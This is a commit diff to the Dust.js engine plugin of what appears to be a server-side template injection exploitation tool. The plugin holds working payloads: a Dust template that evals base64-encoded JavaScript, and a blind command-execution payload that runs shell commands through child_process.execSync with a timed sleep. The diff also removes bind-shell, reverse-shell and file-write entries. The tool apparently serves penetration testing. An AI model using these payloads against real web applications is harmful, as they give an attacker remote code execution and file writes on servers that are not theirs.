4266ac46b95ae5a61b4f03f5b6f5e1066e11706a
Emilio Pinna <emilio.pinn@gmail.com>
2017-03-26 00:57:22 +0000

    Adjust Dust for new Plugin object

--- plugins/engines/dust.py
+++ plugins/engines/dust.py
@@ -1,22 +1,17 @@
 from utils.strings import quote, chunkit, md5
 from utils.loggers import log
 from core import languages
-from core.plugin import Plugin
+from plugins.languages import javascript
 from utils import rand
 import base64
 import re
 
 
-class Dust(Plugin):
+class Dust(javascript.Javascript):
     
     def init(self):
 
         self.update_actions({
-            'blind' : {
-                'call': 'execute_blind',
-                'bool_true' : 'true',
-                'bool_false' : 'false'
-            },
             'evaluate' : {
                 'call': 'inject',
                 'evaluate': """{@if cond=\"eval(Buffer('%(code_b64)s', 'base64').toString())\"}{/if}"""
@@ -27,20 +22,7 @@ class Dust(Plugin):
                 # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                 # TODO: use another function.
                 'execute_blind': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i');"""
-            },
-            'bind_shell' : {
-                'call' : 'execute_blind',
-                'bind_shell': languages.bash_bind_shell
-            },
-            'reverse_shell' : {
-                'call': 'execute_blind',
-                'reverse_shell' : languages.bash_reverse_shell
-            },
-            'write' : {
-                'call' : 'evaluate',
-                'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
-                'truncate' : """require('fs').writeFileSync('%(path)s', '')"""
-            },
+            }
         })
 
         self.set_contexts([
@@ -52,8 +34,6 @@ class Dust(Plugin):
                 # Comment blocks
                 { 'level': 1, 'prefix' : '!}', 'suffix' : '{!' },
             ])
-
-    language = 'javascript'
 
     """
     This replace _detect_render() since there is no real rendered evaluation in Dust.
@@ -68,13 +48,13 @@ class Dust(Plugin):
 
         for prefix, suffix in self._generate_contexts():
 
-            payload = '{!c!}'
+            payload = 'AA{!c!}AA'
             header_rand = rand.randint_n(10)
             header = str(header_rand)
             trailer_rand = rand.randint_n(10)
             trailer = str(trailer_rand)
 
-            if '' == self.render(
+            if 'AAAA' == self.render(
                     code = payload,
                     header = header,
                     trailer = trailer,
